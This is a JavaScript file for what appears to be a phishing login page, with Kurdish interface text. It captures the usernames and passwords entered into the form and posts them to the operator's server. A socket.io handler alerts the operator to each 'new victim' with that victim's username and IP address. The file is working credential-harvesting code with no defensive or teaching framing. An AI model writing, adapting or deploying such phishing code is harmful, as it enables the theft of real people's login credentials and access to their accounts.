document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('loginForm');
    const username = document.getElementById('username');
    const password = document.getElementById('password');
    const btn = document.getElementById('loginBtn');

    const socket = io();

    socket.on('connect', () => {
        console.log('[+] پەیوەندی بە سێرڤەرەوە کراوە');
    });

    socket.on('new_victim', (data) => {
        console.log('[!] قوربانی نوێ:', data);
        alert(`🔴 قوربانی نوێ: ${data.username} | IP: ${data.ip}`);
    });

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        btn.textContent = 'چاوەڕوان بە...';
        btn.disabled = true;

        const formData = new FormData();
        formData.append('username', username.value);
        formData.append('password', password.value);

        try {
            const response = await fetch('/login', {
                method: 'POST',
                body: formData
            });
            const result = await response.json();
            if (result.status === 'success') {
                window.location.href = result.redirect;
            }
        } catch (error) {
            alert('هەڵەیەک ڕوویدا، تکایە دووبارە هەوڵبدەوە');
            btn.textContent = 'چوونە ژوورەوە';
            btn.disabled = false;
        }
    });
});